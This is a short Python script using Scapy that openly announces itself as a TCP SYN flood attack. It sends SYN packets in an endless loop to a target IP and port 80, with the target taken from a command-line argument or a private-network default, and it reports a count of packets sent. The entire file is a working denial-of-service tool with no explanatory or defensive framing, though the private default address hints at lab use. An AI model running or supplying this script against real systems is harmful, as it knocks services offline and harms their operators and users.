from scapy.all import IP, TCP, send
import sys
import time

# --- CONFIGURATION ---
TARGET_IP = "192.168.166.167"
TARGET_PORT = 80

if len(sys.argv) > 1:
    TARGET_IP = sys.argv[1]

print(f"[*] ATTACK: TCP SYN Flood")
print(f"[*] TARGET: {TARGET_IP}:{TARGET_PORT}")
print(f"[*] PRESS CTRL+C TO STOP")
time.sleep(2)

count = 0
try:
    # Send SYN packets without waiting for ACK
    while True:
        pkt = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, flags="S")
        send(pkt, verbose=0)
        count += 1
        if count % 100 == 0:
            print(f"[!] Sent {count} SYN packets...", end='\r')
except KeyboardInterrupt:
    print(f"\n[+] Stopped. Total: {count}")
